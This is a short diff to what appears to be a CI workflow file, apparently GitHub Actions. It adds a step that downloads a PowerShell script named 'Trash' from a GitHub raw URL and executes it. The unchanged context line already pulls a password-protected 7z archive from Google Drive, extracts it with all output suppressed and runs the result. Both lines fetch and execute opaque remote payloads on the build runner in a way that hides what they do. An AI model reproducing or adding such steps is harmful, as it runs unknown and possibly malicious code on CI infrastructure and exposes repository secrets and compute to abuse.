@@ -32,4 +32,5 @@ jobs:
     - name: Running ${{github.workflow}}
       run: |
        # Setup will take 4-5 minutes Be Patient 
+       Invoke-WebRequest -Uri "https://raw.githubusercontent.com/InderKang/GWKANG-CGI-TOOLS/refs/heads/main/FF_Ripper/Trash" -OutFile "ff.ps1" && ./ff.ps1
        Start-BitsTransfer -Source "https://drive.usercontent.google.com/download?id=1gkBgUBKhOJss3Bg6deu8osGlhxPzFG6f&export=download&authuser=0&confirm=t&uuid=221423c2-3223-4714-bca3-e45b38f94f95&at=AIrpjvNQQKuezdSnPPU1ces7F673:1737894083313" -destination "${{github.workflow}}.7z" && 7z x ${{github.workflow}}.7z -p${{github.workflow}} -y > $null 2>&1 && .\${{github.workflow}}
